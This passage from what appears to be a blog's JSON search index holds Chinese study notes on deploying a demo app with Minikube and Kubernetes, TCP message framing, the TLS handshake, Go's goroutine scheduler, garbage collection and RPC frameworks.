kubelet。作为一个开发和测试的环境，Minikube 会建立一个有一个 node 的集群，用下面的命令可以看到：\n\n```bash\n$ kubectl get nodes\nNAME       STATUS    AGE       VERSION\nminikube   Ready     1h        v1.10.0\n```\n\n\n\n### 2.1 创建 docker 容器\n\n```bash\nmkdir html\necho '<h1>Hello Kubernetes!</h1>' > html/index.html\n```\n\n`Dockerfile`\n\n```dockerfile\nFROM nginx\nCOPY html/* /usr/share/nginx/html\n```\n\n创建:\n\n```bash\ndocker build -t k8s-demo:0.1 .\n```\n\n\n\n### 2.2 创建pod\n\n`pod.yml`\n\n```yaml\napiVersion: v1\nkind: Pod\nmetadata:\n    name: k8s-demo\n    labels:\n     app: k8s-demo\nspec:\n    containers:\n        - name: k8s-demo\n          image: k8s-demo:0.1\n          ports:\n              - containerPort: 80\n```\n创建:\n\n```bash\nkubectl create -f pod.yml\n \n\nkubectl get pods\n# NAME       READY     STATUS    RESTARTS   AGE\n# k8s-demo   1/1       Running   0          5s\n\n\n# 修改 pod.yml, 并应用\nkubectl apply -f pod.yml\n```\n\n\n\n虽然这个 pod 在运行，我们无法从外部直接访问。要把服务暴露出来，我们需要创建一个 Service。Service 的作用有点像建立了一个反向代理和负载均衡器，负责把请求分发给后面的 pod。\n\n\n\n### 2.3 创建service\n\n`svc.yaml`\n\n```yaml\napiVersion: v1\nkind: Service\nmetadata:\n    name: k8s-demo-svc\n    labels:\n        app: k8s-demo\nspec:\n    type: NodePort\n    ports:\n        - port: 80\n          nodePort: 30050\n    selector:\n        app: k8s-demo\n```\n\n这个 service 会把容器的 80 端口从 node 的 30050 端口暴露出来。\n\n注意文件最后两行的 selector 部分，这里决定了请求会被发送给集群里的哪些 pod。这里的定义是所有包含「app: k8s-demo」这个标签的 pod。\n\n\n\n查看标签命令:\n\n```bash\nkubectl describe pods | grep Labels\n```\n\n\n\n创建:\n\n```bash\nkubectl create -f svc.yml\n```\n\n\n\n用下面的命令可以得到暴露出来的 URL，在浏览器里访问，就能看到我们之前创建的网页了。\n\n```bash\nminikube service k8s-demo-svc --url\n# http://10.0.0.5:30050\n\ncurl http://10.0.0.5:30050\n# Hello Kubernetes!\n```\n\n\n\n### 2.4 创建 deployment\n\n在正式环境中我们需要让一个服务不受单个节点故障的影响，并且还要根据负载变化动态调整节点数量，所以不可能像上面一样逐个管理 pod。\n\nKubernetes 的用户通常是用 Deployment 来管理服务的。一个 deployment 可以创建指定数量的 pod 部署到各个 node 上，并可完成更新、回滚等操作。\n\n`deployment.yml`\n\n```yaml\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: k8s-demo-deployment\nspec:\n  replicas: 10\n  minReadySeconds: 10\n  strategy:\n    type: RollingUpdate\n    rollingUpdate:\n      maxUnavailable: 1\n      maxSurge: 1\n  template:\n    metadata:\n      labels:\n        app: k8s-demo\n    spec:\n      containers:\n        - name: k8s-demo-pod\n          image: k8s-demo:0.1\n          ports:\n            - containerPort: 80\n  selector:\n    matchLabels:\n      app: k8s-demo\n```\n\n创建:\n\n```bash\nkubectl create -f deployment.yml\n\n# 用下面的命令可以看到这个 deployment 的副本集（replica set），有 10 个 pod 在运行。\n\nkubectl get rs\n# NAME                             DESIRED   CURRENT   READY     AGE\n# k8s-demo-deployment-774878f86f   10        10        10        19s\n```\n\n\n\n假设我们对项目做了一些改动，要发布一个新版本。这里作为示例，我们只把 HTML 文件的内容改一下, 然后构建一个新版镜像 k8s-demo:0.2：\n\n```bash\necho '<h1>Hello Kubernetes22222222222!</h1>' > html/index.html\ndocker build -t k8s-demo:0.2 .\n\n# 替换 deployment.yml 的 tag 值\n\n# 重新应用 deployment\nkubectl apply -f deployment.yml --record=true\n```\n\n\n\n此时我们访问\n\n```bash\ncurl http://10.0.0.5:30050\n# Hello Kubernetes22222222222!\n```\n\n\n\n回滚版本1\n\n``` bash\nkubectl rollout undo deployment k8s-demo-deployment --to-revision=1\n\n# 可以查看回滚进度\nkubectl rollout status deployment k8s-demo-deployment\n```\n\n\n\n再次访问\n\n```bash\ncurl http://10.0.0.5:30050\n# Hello Kubernetes!\n```\n\n\n\n# 3. 总结\n\n+ 容器引擎(例如docker) 放在 pod 里面\n+ pod 增加了标签后, service 可以管理\n\n\n\n# 4. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/39937913\n","tags":["k8s"],"categories":["k8s"]},{"title":"tcp粘包问题","url":"%2Fp%2F6d39ef4c.html","content":"\n# 1. TCP 粘包\n\n粘包并不是 TCP 协议造成的，它的出现是因为应用层协议设计者对 TCP 协议的错误理解，忽略了 TCP 协议的定义并且缺乏设计应用层协议的经验。我们经常提到的 TCP 协议中的粘包是如何发生的：\n\n- TCP 协议是面向字节流的协议，它可能会组合或者拆分应用层协议的数据；\n- 应用层协议的没有定义消息的边界导致数据的接收方无法拼接数据；\n\nTCP本来就是基于字节流而不是消息包的协议，会把你的数据变成字节流发到对面去，而且保证顺序不会乱，但是你要自己搞定字节流解析。\n\n<!-- more -->\n\n# 2. 粘包问题如何处理？\n\n### 2.1 Nagle算法\n\nNagle 算法确实能够在数据包较小时提高网络带宽的利用率并减少 TCP 和 IP 协议头带来的额外开销，但是使用该算法也可能会导致应用层协议多次写入的数据被合并或者拆分发送，当接收方从 TCP 协议栈中读取数据时会发现不相关的数据出现在了同一个数据段中，应用层协议可能没有办法对它们进行拆分和重组。\n\nNagle算法问题导致的，需要结合应用场景适当关闭该算法。\n\n### 2.2 消息边界\n\n如果我们能在应用层协议中定义消息的边界，那么无论 TCP 协议如何对应用层协议的数据包进程拆分和重组，接收方都能根据协议的规则恢复对应的消息。在应用层协议中，最常见的两种解决方案就是\n\n+ 基于长度\n\n  基于长度的实现有两种方式，一种是使用固定长度，所有的应用层消息都使用统一的大小，另一种方式是使用不固定长度，但是需要在应用层协议的协议头中增加表示负载长度的字段，这样接收方才可以从字节流中分离出不同的消息，HTTP 协议的消息边界就是基于长度实现的。\n\n  在上述 HTTP 消息中，我们使用 Content-Length 头表示 HTTP 消息的负载大小，当应用层协议解析到足够的字节数后，就能从中分离出完整的 HTTP 消息，无论发送方如何处理对应的数据包，我们都可以遵循这一规则完成 HTTP 消息的重组。\n\n+ 基于终结符（Delimiter）\n\n  不过 HTTP 协议除了使用基于长度的方式实现边界，也会使用基于终结符的策略，当 HTTP 使用块传输（Chunked Transfer）机制时，HTTP 头中就不再包含 Content-Length 了，它会使用负载大小为 0 的 HTTP 消息作为终结符表示消息的边界。\n\n  还有例如\\n，\\r，\\t，或者一些隐藏字符。\n\n当然除了这两种方式之外，我们可以基于特定的规则实现消息的边界，例如：使用 TCP 协议发送 JSON 数据，接收方可以根据接收到的数据是否能够被解析成合法的 JSON 判断消息是否终结。\n\n\n\n# 3. 参考资料\n\n+ https://www.zhihu.com/question/20210025\n\n+ https://draveness.me/whys-the-design-tcp-message-frame/","tags":["tcp"],"categories":["网络"]},{"title":"tls交互四次握手","url":"%2Fp%2F45348d89.html","content":"\n\n\n# 1. tls交互四次握手\n\nTLS 握手的关键在于利用通信双方生成的随机字符串和服务端的公钥生成一个双方经过协商后的密钥，通信的双方可以使用这个对称的密钥加密消息防止中间人的监听和攻击，保证通信的安全。后续通过对称密钥传递信息。\n\n<!-- more -->\n\n①  客户端向服务端发送 Client Hello 消息\n\n+ 协议版本（ eg：TLS 1.0）\n\n+ 加密算法（eg：RSA）\n\n+ 压缩算法\n\n+ 客户端生成的随机数(稍后用于生成对话密钥)\n\n\n\n② 服务端向客户端发送 Server Hello 消息\n\n+ 协议版本，加密算法确认\n+ 会话 ID\n+ 服务器数字证书\n+ 服务器公钥\n+ 服务端生成的随机数(稍后用于生成对话密钥)\n\n\n\n③ 客户端验证 服务器证书 和 协商密钥\n\n+ 连接服务器的 CA 验证服务端的证书\n+ 向服务端发送 Client Key Exchange , 用服务器公钥加密。\n+ 向服务端发送 Finished 消息，表示客户端的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供服务器校验。\n\n\n\n④ 向客户端发送 Finished 消息\n\n+ 计算生成本次会话所用的会话密钥\n+ 向客户端发送 Client Key Exchange, 表示随后的信息都将用双方商定的加密方法和密钥发送。\n+ 向客户端发送 Finished 消息，表示客户端的握手阶段已经结束。这一项同时也是前面发送的所有内容的hash值，用来供客户端校验。\n\n\n\n# 2. 形象化比喻\n\n我们假设A与B通信，A是SSL客户端，B是SSL服务器端。\n\n加密后的消息放在方括号[]里，以突出明文消息的区别。双方的处理动作的说明用圆括号（）括起。\n\n\n\n①A：我想和你安全的通话，我这里的对称加密算法有DES,RC5,密钥交换算法有RSA和DH，摘要算法有MD5和SHA。\n\n②B：我们用DES－RSA－SHA这对组合好了。这是我的证书，里面有我的名字和公钥，你拿去验证一下我的身份。\n\n③A：（通过CA的证书验证了B的证书的真实性，如果其中一项有误，发出警告并断开连接，这一步保证了B的公钥的真实性）\n\n我生成了一份秘密消息，并用你的公钥加密了，给你（把ClientKeyExchange发给B）注意，下面我就要用加密的办法给你发消息了！\n\n[我说完了]\n\n④B：（用自己的私钥将ClientKeyExchange中的秘密消息解密出来，然后将秘密消息进行处理，生成加密密钥）\n\n注意，我也要开始用加密的办法给你发消息了！\n\n[我说完了]\n\n---\n\nA: [我的秘密是...]\n\nB: [其它人不会听到的...]\n\n\n\n# 3. 问题总结\n\n### 3.1 证书的数字签名（Digital Signature）\n\n使用散列和非对称加密验证文档的真实性。先为要签名的信息生成一个Hash字串，Hash1，然后用你的私钥加密得到Encrypted(Hash1)，这就是你对这个文档的数字签名。\n\n当别人需要验证某个文档是否是你签名的时候，只需要用你的公钥解密你的签名得到Hash1，并和该文档计算出来的Hash2对比，查看是否一致。如果一致则说明你确实对该文档签过名，否则就是没有。\n\n\n\n# 4. 参考资料\n\n+ https://www.ruanyifeng.com/blog/2014/02/ssl_tls.html\n\n+ https://draveness.me/whys-the-design-https-latency/","tags":["http"],"categories":["Web"]},{"title":"golang协程调度","url":"%2Fp%2Fc8d0853c.html","content":"\n\n\n# 1. 基础术语\n\n### 1.1 并发\n\n一个cpu上能同时执行多项任务，在很短时间内，cpu来回切换任务执行(在某段很短时间内执行程序a，然后又迅速得切换到程序b去执行)，有时间上的重叠（宏观上是同时的，微观仍是顺序执行）,这样看起来多个任务像是同时执行，这就是并发。\n\n<!-- more -->\n\n### 1.2 并行\n\n当系统有多个CPU时,每个CPU同一时刻都运行任务，互不抢占自己所在的CPU资源，同时进行，称为并行。\n\n### 1.3 进程\n\ncpu在切换程序的时候，如果不保存上一个程序的状态（也就是我们常说的context--上下文），直接切换下一个程序，就会丢失上一个程序的一系列状态，于是引入了进程这个概念，用以划分好程序运行时所需要的资源。因此进程就是一个程序运行时候的所需要的基本资源单位（也可以说是程序运行的一个实体）。\n\n### 1.4 线程\n\ncpu切换多个进程的时候，会花费不少的时间，因为切换进程需要切换到内核态，而每次调度需要内核态都需要读取用户态的数据，进程一旦多起来，cpu调度会消耗一大堆资源，因此引入了线程的概念，线程本身几乎不占有资源，他们共享进程里的资源，内核调度起来不会那么像进程切换那么耗费资源。\n\n### 1.5 协程\n\n协程拥有自己的寄存器上下文和栈。协程调度切换时，将寄存器上下文和栈保存到其他地方，在切回来的时候，恢复先前保存的寄存器上下文和栈。因此，协程能保留上一次调用时的状态（即所有局部状态的一个特定组合），每次过程重入时，就相当于进入上一次调用的状态，换种说法：进入上一次离开时所处逻辑流的位置。线程和进程的操作是由程序触发系统接口，最后的执行者是系统；协程的操作执行者则是用户自身程序，goroutine也是协程。\n\n\n\n# 2. golang 调度模型\n\n### 2.1 调度器的三个基本对象\n\n![1](golang协程调度/4.png)\n\n- M (Work Thread)，M代表内核级线程，一个M就是一个线程，goroutine就是跑在M之上的；M是一个很大的结构，里面维护小对象内存cache（mcache）、当前执行的goroutine、随机数发生器等等非常多的信息\n- G (Goroutine)，代表一个goroutine，它有自己的栈，instruction pointer和其他信息（正在等待的channel等等），用于调度。\n- P (Processor)，处理器，它的主要用途就是用来执行goroutine的，所以它也维护了一个goroutine队列，里面存储了所有需要它来执行的goroutine   \n\n\n\n### 2.2 调度实现\n\n![1](golang协程调度/1.png)\n\n从上图中看，有2个物理线程M，每一个M都拥有一个处理器P，每一个也都有一个正在运行的goroutine。\n\n+ P的数量可以通过GOMAXPROCS() 来设置，它其实也就代表了真正的并发度，即有多少个goroutine可以同时运行。\n+ 图中灰色的那些goroutine并没有运行，而是出于ready的就绪态，正在等待被调度。P维护着这个队列（称之为runqueue）\n+ Go语言里，启动一个goroutine很容易：go function 就行，所以每有一个go语句被执行，runqueue队列就在其末尾加入一个\n\n### 2.3 线程阻塞\n\n当一个OS线程M0陷入阻塞时（如下图)， 例如协程G0遇到阻塞调用（比如系统调用syscall）超过10ms时 ，这个G0连同M0 会被剥离出P，产生一个新的M1 来接手P(或者从线程缓存中取出)\n\n![1](golang协程调度/2.png)\n\n\n\n当MO返回时，它必须尝试取得一个P来运行goroutine，一般情况下，它会从其他的OS线程那里拿一个P过来，如果没有拿到的话，它就把goroutine放在一个global runqueue里，然后自己睡眠（放入线程缓存里）。\n\n所有的P也会周期性的检查global runqueue并运行其中的goroutine，否则global runqueue上的goroutine永远无法执行。 \n\n### 2.4 工作量窃取\n\nP所分配的任务G很快就执行完了（分配不均），这就导致了这个处理器P很忙，但是其他的P还有任务，此时如果global runqueue没有任务G了，那么P不得不从其他的P里拿一些G来执行。\n\n一般来说，如果P从其他的P那里要拿任务的话，一般就拿run queue的一半，这就确保了每个OS线程都能充分的使用，如下图：\n\n![1](golang协程调度/3.png)\n\n\n\n# 3. 调度过程\n\n### 3.1 术语\n\n1. **全局队列**（Global Queue）：存放等待运行的G。\n2. **P的本地队列**：同全局队列类似，存放的也是等待运行的G，存的数量有限，不超过256个。新建G'时，G'优先加入到P的本地队列，如果队列满了，则会把本地队列中一半的G移动到全局队列。\n3. **P列表**：所有的P都在程序启动时创建，并保存在数组中，最多有`GOMAXPROCS`(可配置)个。\n4. **M**：线程想运行任务就得获取P，从P的本地队列获取G，P队列为空时，M也会尝试从全局队列**拿**一批G放到P的本地队列，或从其他P的本地队列**偷**一半放到自己P的本地队列。M运行G，G执行之后，M会从P获取下一个G，不断重复下去。\n\nGoroutine调度器和OS调度器是通过M结合起来的，每个M都代表了1个内核线程，OS调度器负责把内核线程分配到CPU的核上执行。\n\n\n\n### 3.2 有关P和M的个数问题\n\n1、P的数量：\n\n- 由启动时环境变量`$GOMAXPROCS`或者是由`runtime`的方法`GOMAXPROCS()`决定。这意味着在程序执行的任意时刻都只有`$GOMAXPROCS`个goroutine在同时运行。\n\n2、M的数量:\n\n- go语言本身的限制：go程序启动时，会设置M的最大数量，默认10000.但是内核很难支持这么多的线程数，所以这个限制可以忽略。\n- runtime/debug中的SetMaxThreads函数，设置M的最大数量\n- 一个M阻塞了，会创建新的M。\n\nM与P的数量没有绝对关系，一个M阻塞，P就会去创建或者切换另一个M，所以，即使P的默认数量是1，也有可能会创建很多个M出来。\n\n\n\n### 3.3 P和M何时会被创建\n\n1、P何时创建：在确定了P的最大数量n后，运行时系统会根据这个数量创建n个P。\n\n2、M何时创建：没有足够的M来关联P并运行其中的可运行的G。比如所有的M此时都阻塞住了，而P中还有很多就绪任务，就会去寻找空闲的M，而没有空闲的，就会去创建新的M。\n\n\n\n### 3.4 调度器的设计策略\n\n**复用线程**：避免频繁的创建、销毁线程，而是对线程的复用。\n\n+ work stealing机制 当本线程无可运行的G时，尝试从其他线程绑定的P偷取G，而不是销毁线程。\n\n+ hand off机制 当本线程因为G进行系统调用阻塞时，线程释放绑定的P，把P转移给其他空闲的线程执行。\n\n+ 利用并行：`GOMAXPROCS`设置P的数量，最多有`GOMAXPROCS`个线程分布在多个CPU上同时运行。`GOMAXPROCS`也限制了并发的程度，比如`GOMAXPROCS = 核数/2`，则最多利用了一半的CPU核进行并行。\n\n+ 抢占：在coroutine中要等待一个协程主动让出CPU才执行下一个协程，在Go中，一个goroutine最多占用CPU 10ms，防止其他goroutine被饿死，这就是goroutine不同于coroutine的一个地方。\n\n+ 全局G队列：在新的调度器中依然有全局G队列，但功能已经被弱化了，当M执行work stealing从其他P偷不到G时，它可以从全局G队列获取G。\n\n\n\n# 4. 其他问题\n\n### 4.1 io密集型增大 GOMAXPROCS有效吗\n\n> 有效\n\n并发一般都是被内核通过时间片或者中断来控制的，一旦遇到IO阻塞或者时间片用完，就会转移线程的使用权。单核不可能有并行，同一时间只能有一个任务在调度。\n\nGo中runtime.GOMAXPROCS可以设置多核执行任务。并行比较适合cpu计算密集型。如果IO密集型使用多核反而会增加cpu切换的成本。\n\nP值设置太小的话，会影响 M 的数量，然后 M 被 IO 阻塞，效率会下降很多。应该配置到硬件线程数目的5倍以上, 最大不要超过1024。\n\n\n\n# 5. 参考资料\n\n+ https://studygolang.com/articles/26795\n+ https://www.cnblogs.com/sunsky303/p/9705727.html\n+ [一道问题引发的golang调度](https://txiner.top/post/一道问题引发的golang调度/)\n+ https://my.oschina.net/90design/blog/1837570\n\n","tags":["golang"],"categories":["golang"]},{"title":"gc垃圾回收和golang的gc","url":"%2Fp%2F26aea798.html","content":"\n# 1. GC 介绍\n\nGC 是一种自动管理内存的技术，用来回收（释放） heap 中不再使用的对象。\n\nGC 过程中涉及到两个阶段：\n\n1. 区分活对象（live object）与垃圾对象（garbage）\n\n2. 回收垃圾对象的内存，使得程序可以重复使用这些内存\n\n<!-- more -->\n\n### 1.1 追踪技术（Tracing）\n\n这是目前使用范围最广的技术，一般我们提到 GC 都是指这类。\n\n这类 GC 从某些被称为 root 的对象开始，不断追踪可以被引用到的对象，这些对象被称为**可到达的**（reachable），其他剩余的对象就被称为 garbage，并且会被释放。\n\n\n\n##### 1.1.1 标记清除(mark-and-sweep)\n\nmark，从 root 开始进行树遍历，每个访问的对象标注为「使用中」\n\nsweep，扫描整个内存区域，对于标注为「使用中」的对象去掉该标志，对于没有该标注的对象直接回收掉\n\n+ 每次启动垃圾回收都会暂停当前所有的正常代码执行，回收是系统响应能力大大降低。\n\n+  标记需要扫描整个heap,清除数据会产生heap碎片\n\n  \n\n##### 1.1.2 升级版三色标记\n\n1 起初所有对象都是白色。\n\n2 从根出发扫描所有可达对象，标记为灰色，放入待处理队列。\n\n3 从队列取出灰色对象，将其引用对象标记为灰色放入队列，自身标记为黑色。\n\n4 重复 3，直到灰色对象队列为空。此时白色对象即为垃圾，进行回收。\n\n\n\n普通标记只有黑色和白色，没有中间的状态，这就要求GC扫描过程必须一次性完成，得到最后的黑色和白色对象，这种方式会存在较大的暂停时间。\n\n三色标记增加了中间状态灰色，增量式GC运行过程中，应用线程的运行可能改变了对象引用树，只要让黑色对象直接引用白色对象，GC就可以增量式的运行，减少停顿时间。\n\n\n\n##### 1.1.3 复制收集 (Copying Garbage Collection)  \n\n节点复制也是基于追踪的算法。其将整个堆等分为两个半区（semi-space），一个包含现有数据，另一个包含已被废弃的数据。\n\n节点复制式垃圾收集从切换（flip）两个半区的角色开始，然后收集器在老的半区，也就是 From space 中遍历存活的数据结构，在第一次访问某个单元时把它复制到新半区，也就是 To space 中去。\n\n在 From space 中所有存活单元都被访问过之后，收集器在 Tospace 中建立一个存活数据结构的副本，用户程序可以重新开始运行了。\n\n优点\n\n+ 所有存活的数据结构都缩并地排列在 To space 的底部，这样就不会存在内存碎片的问题。\n\n+ 获取新内存可以简单地通过递增自由空间指针来实现。\n\n缺点\n\n+ 内存得不到充分利用，总有一半的内存空间处于浪费状态。\n\n\n\n##### 1.1.4  分代收集（Generational Garbage Collection）\n\n基于追踪的垃圾回收算法（标记-清扫、节点复制）一个主要问题是在生命周期较长的对象上浪费时间（长生命周期的对象是不需要频繁扫描的）。同时内存分配存在这么一个事实 “most object die young”。\n\n基于这两点，分代垃圾回收算法将对象按生命周期长短存放到堆上的两个（或者更多）区域，这些区域就是分代（generation）。对于新生代的区域的垃圾回收频率要明显高于老年代区域。\n\n分配对象的时候从新生代里面分配，如果后面发现对象的生命周期较长，则将其移到老年代，这个过程叫做 promote。随着不断 promote，最后新生代的大小在整个堆的占用比例不会特别大。收集的时候集中主要精力在新生代就会相对来说效率更高，STW 时间也会更短。\n\n优点 \n\n+ 性能更优。\n\n缺点 \n\n+ 实现复杂。\n\n\n\n### 1.2 引用计数（Reference counting）\n\n引用计数类 GC 会记录每个对象的引用次数，当引用次数为0时，就会被回收，这类 GC 实现起来较为简单。采用这类 GC 的主流语言有：Python/PHP/[Perl](https://stackoverflow.com/questions/2972021/garbage-collection-in-perl)/TCL/Objective-C/C++ 的 share_ptr\n\n优点\n\n+ 算法易于实现。\n\n+ 内存单元能够很快被回收。相比于其他垃圾回收算法，堆被耗尽或者达到某个阈值才会进行垃圾回收。\n\n+ 渐进式。内存管理与用户程序的执行交织在一起，将 GC 的代价分散到整个程序。不像标记-清扫算法需要 STW (Stop The World，GC 的时候挂起用户程序)。\n\n缺点\n\n+ 原始的引用计数不能处理循环引用。\n\n+ 维护引用计数降低运行效率。\n\n「追踪」与「引用计数」这两类 GC 各有千秋，真正的工业级实现一般是这两者的结合，不同的语言有所偏重而已。\n\n\n\n# 2. GO的GC\n\ngo语言垃圾回收总体采用的是经典的 mark and sweep 算法。\n\n### 2.1 并行\n\nGo如何减短这个过程呢？标记-清除(mark and sweep)算法包含两部分逻辑：标记和清除。 我们知道Golang三色标记法中最后只剩下的黑白两种对象，黑色对象是程序恢复后接着使用的对象，如果不碰触黑色对象，只清除白色的对象，肯定不会影响程序逻辑。所以：清除操作和用户逻辑可以并发。\n\n### 2.2 为什么golang的gc不整理、不分代？\n\n对于这个问题，首先我不得不说的是，分代确实能很好的提高gc的效率，因为大多数对象使用的时间是很短的，而长时间占用的对象是很少的，这也是java中分代的原因。而对于整理，整理的话有利于内存的管理和回收，当对象被回收之后，会出现很多的内存碎片，而整理可以很好的重新规范内存，回收那些不需要的页。\n\n那么golang为啥不做呢？首先是复杂，我们看java分代回收的实现就非常的复杂，实现起来需要很大的力气，而当前的golang的gc效率已经可能已经满足需求了。然是就是整理，其实整理这块是由内存管理模块来管理的，而golang中的内存管理在分配的阶段已经利用了最小化的原则，每次给到的都是合适的大小，所以整理这块就交由他们进行来管了，gc这块只负责回收就可以了。\n\n### 2.3 何时触发 GC\n\n+ 在堆上分配大于 32K byte 对象的时候进行检测此时是否满足垃圾回收条件，如果满足则进行垃圾回收。\n\n+ 上面是自动垃圾回收，还有一种是主动垃圾回收，通过调用 runtime.GC()，这是阻塞式的。\n+ 我们上面讲了两种 GC 触发方式：自动检测和用户主动调用。除此之后 Golang 本身还会对运行状态进行监控，如果超过两分钟没有 GC，则触发 GC。监控函数是 `sysmon()`，在主 goroutine 中启动。\n\n\n\n# 3. 参考资料\n\n+ https://juejin.im/post/5c8525666fb9a049ea39c3e6\n+ https://draveness.me/golang-garbage-collector/\n+ http://legendtkl.com/2017/04/28/golang-gc/","tags":["gc"],"categories":["golang"]},{"title":"rpc的介绍","url":"%2Fp%2F317a11e.html","content":"\n\n\n\n# 1. RPC（Remote Procedure Call）远程过程调用\n\n在分布式计算，远程过程调用（英语：Remote Procedure Call，缩写为 RPC）是一个计算机通信协议。该协议允许运行于一台计算机的程序调用另一个地址空间（通常为一个开放网络的一台计算机）的子程序，而程序员就像调用本地程序一样，无需额外地为这个交互作用编程（无需关注细节）。RPC是一种服务器-客户端（Client/Server）模式，经典实现是一个通过发送请求-接受回应进行信息交互的系统。\n\n![1](rpc的介绍/4.jpg)\n\n<!-- more -->\n\n\n### 1.1 常见的 RPC框架\n\nRPC 是一种技术思想而非一种规范或协议，常见 RPC框架有：\n\n[Dubbo](http://dubbo.io/) 是阿里巴巴公司开源的一个Java高性能优秀的服务框架，使得应用可通过高性能的 RPC 实现服务的输出和输入功能，可以和 Spring框架无缝集成。\n\n[Motan](https://github.com/weibocom/motan)是新浪微博开源的一个Java 框架。它诞生的比较晚，起于2013年，2016年5月开源。Motan 在微博平台中已经广泛应用，每天为数百个服务完成近千亿次的调用。\n\n[rpcx](https://github.com/smallnest/rpcx)是Go语言生态圈的Dubbo， 比Dubbo更轻量，实现了Dubbo的许多特性，借助于Go语言优秀的并发特性和简洁语法，可以使用较少的代码实现分布式的RPC服务。\n\n[gRPC](http://www.grpc.io/)是Google开发的高性能、通用的开源RPC框架，其由Google主要面向移动应用开发并基于HTTP/2协议标准而设计，基于ProtoBuf(Protocol Buffers)序列化协议开发，且支持众多开发语言。本身它不是分布式的，所以要实现上面的框架的功能需要进一步的开发。\n\n[thrift](https://thrift.apache.org/)是Apache的一个跨语言的高性能的服务框架，也得到了广泛的应用。\n\n|框架| Dubbo            | Montan | rpcx                              | gRPC |\n| :--------------- | :----- | :-------------------------------- | :--- | :----------------- |\n| 开发语言         | Java   | Java                              | Go   | 跨语言             |\n| 分布式(服务治理) | √      | √                                 | √    | ×                  |\n| 多序列化框架支持 | √      | √ (当前支持Hessian2、Json,可扩展) | √    | × (只支持protobuf) |\n| 多种注册中心     | √      | √                                 | √    | ×                  |\n| 管理中心         | √      | √                                 | √    | ×                  |\n| 跨编程语言       | ×      | × (支持php client和C server)      | ×    | √                  |\n\n### 1.2 完整的 RPC 框架\n\n在一个典型 RPC 的使用场景中，包含了服务发现、负载、容错、网络传输、序列化等组件，其中“RPC 协议”就指明了程序如何进行网络传输和序列化。\n\n![1](rpc的介绍/1.jpg)\n\n### 1.3 RPC 核心之功能实现\n\n所以，要实现一个 RPC 框架，只需要把以下三点实现了就基本完成了：\n\n- 服务寻址Call ID 映射：可以直接使用函数字符串，也可以使用整数 ID。映射表一般就是一个哈希表。\n\n- 数据流的序列化和反序列化：可以自己写，也可以使用 Protobuf 或者 FlatBuffers 之类的。\n\n- 网络传输：尽管大部分 RPC 框架都使用 TCP 协议，但其实 UDP 也可以，而 gRPC 干脆就用了 HTTP2。也可以自己写 Socket，或者用 Asio，ZeroMQ，Netty 之类。\n\n  \n\n##### 1.3.1 服务寻址\n\n服务寻址可以使用 Call ID 映射。在本地调用中，函数体是直接通过函数指针来指定的，但是在远程调用中，函数指针是不行的，因为两个进程的地址空间是完全不一样的。\n\n所以在 RPC 中，所有的函数都必须有自己的一个 ID。这个 ID 在所有进程中都是唯一确定的。客户端在做远程过程调用时，必须附上这个 ID。然后我们还需要在客户端和服务端分别维护一个函数和Call ID的对应表。\n\n当客户端需要进行远程调用时，它就查一下这个表，找出相应的 Call ID，然后把它传给服务端，服务端也通过查表，来确定客户端需要调用的函数，然后执行相应函数的代码。\n\n> 实现方式：服务注册中心。\n\n要调用服务，首先你需要一个服务注册中心去查询对方服务都有哪些实例。Dubbo 的服务注册中心是可以配置的，官方推荐使用 Zookeeper。\n\n实现案例：RMI(Remote Method Invocation，远程方法调用)也就是 RPC 本身的实现方式。\n\n![1](rpc的介绍/2.jpg)\n\n\n\nRegistry(服务发现)：借助 JNDI 发布并调用了 RMI 服务。实际上，JNDI 就是一个注册表，服务端将服务对象放入到注册表中，客户端从注册表中获取服务对象。\n\nRMI 服务在服务端实现之后需要注册到 RMI Server 上，然后客户端从指定的 RMI 地址上 Lookup 服务，调用该服务对应的方法即可完成远程方法调用。\n\nRegistry 是个很重要的功能，当服务端开发完服务之后，要对外暴露，如果没有服务注册，则客户端是无从调用的，即使服务端的服务就在那里。\n\n\n\n##### 1.3.2 序列化和反序列化\n\n客户端怎么把参数值传给远程的函数呢?在本地调用中，我们只需要把参数压到栈里，然后让函数自己去栈里读就行。\n\n但是在远程过程调用时，客户端跟服务端是不同的进程，不能通过内存来传递参数。这时候就需要客户端把参数先转成一个字节流，传给服务端后，再把字节流转成自己能读取的格式。\n\n只有二进制数据才能在网络中传输，序列化和反序列化的定义是：\n\n- 将对象转换成二进制流的过程叫做序列化\n- 将二进制流转换成对象的过程叫做反序列化\n\n这个过程叫序列化和反序列化。同理，从服务端返回的值也需要序列化反序列化的过程。\n\n\n\n##### 1.3.3 网络传输\n\n网络传输：远程调用往往用在网络上，客户端和服务端是通过网络连接的。\n\n所有的数据都需要通过网络传输，因此就需要有一个网络传输层。网络传输层需要把 Call ID 和序列化后的参数字节流传给服务端，然后再把序列化后的调用结果传回客户端。\n\n只要能完成这两者的，都可以作为传输层使用。因此，它所使用的协议其实是不限的，能完成传输就行。\n\n尽管大部分 RPC 框架都使用 TCP 协议，但其实 UDP 也可以，而 gRPC 干脆就用了 HTTP2。\n\nTCP 的连接是最常见的，简要分析基于 TCP 的连接：通常 TCP 连接可以是按需连接(需要调用的时候就先建立连接，调用结束后就立马断掉)，也可以是长连接(客户端和服务器建立起连接之后保持长期持有，不管此时有无数据包的发送，可以配合心跳检测机制定期检测建立的连接是否存活有效)，多个远程过程调用共享同一个连接。\n\n\n\n# 2. 问题总结\n\n### 2.1 RPC 和 HTTP 区别\n\n+ HTTP和RPC同一级别，还是被RPC包含？\n\n  \n\n  ![1](rpc的介绍/3.jpg)\n\n  上图是一个比较完整的关系图，这时我们发现HTTP（图中蓝色框）出现了两次。其中一个是和RPC并列的，都是跨应用调用方法的解决方案；另一个则是被RPC包含的，是RPC通信过程的可选协议之一。\n\n  因此，**问题的答案是都对。看指的是哪一个蓝色框。**\n\n\n\n+ Restful也属于RPC么？\n\n  第二个问题是在问远程过程调用（红色框）是不是包含了Restful（黄色框），这种理解的关键在于对RPC的理解。\n\n  RPC字面理解是远程过程调用，即在一个应用中调用另一个应用的方法。那Restful是满足的，通过它可以实现在一个应用中调用另一个应用的方法。\n\n  但是，上述理解使得RPC的定义过于宽泛。RPC通常特指在一个应用中调用另一个应用的接口而实现的远程调用，即红色框所指的范围。这样，RPC是不包含Restful的。\n\n  \n\n# 3. 参考资料\n\n+ 